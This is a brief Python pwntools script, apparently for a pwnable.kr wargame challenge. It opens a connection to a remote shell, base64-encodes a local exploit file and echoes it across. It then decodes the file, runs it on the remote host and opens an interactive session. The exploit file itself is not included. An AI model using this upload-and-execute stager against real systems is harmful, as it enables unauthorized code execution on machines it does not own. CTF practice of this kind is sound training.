from pwn import *
r = remote("pwnable.kr",9047)

with open("sizcaller_exploit.py", "rb") as f:
    exploit_b64 = base64.b64encode(f.read())
r.sendline(b"echo " + exploit_b64 + b" > exp.b64 && base64 -d exp.b64 > exp.py")

r.sendline(b"python exp.py")
# if it didn't work, try again
r.interactive()